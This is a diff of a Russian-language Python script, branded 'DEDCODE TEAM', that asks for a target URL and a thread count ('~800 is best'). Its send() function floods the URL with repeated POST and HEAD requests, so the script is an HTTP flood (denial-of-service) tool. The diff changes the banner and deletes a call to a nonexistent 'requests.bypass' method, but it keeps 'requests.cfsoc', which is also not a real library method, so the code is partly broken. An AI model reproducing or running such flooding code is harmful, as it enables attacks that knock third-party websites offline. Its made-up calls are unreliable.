@@ -38,7 +38,7 @@ os.system("clear")
 print(green + f" З А Г Р У З К А....")
 time.sleep(1.5)
 os.system("clear")
-print(" '''🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼''' ")
+print("   🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼    ")
 
 url = input("Ссылка: ")
 threads = int(input("Потоки (~800 лучше): "))
@@ -55,8 +55,6 @@ def send():
         print("post...")
         requests.head(url, headers=headers, data=payload)
         print("head...")
-        requests.bypass(url, headers=headers, data=payload)
-        print("bypass...")
         requests.cfsoc(url, headers=headers, data=payload)
         print("cfsoc...")
 
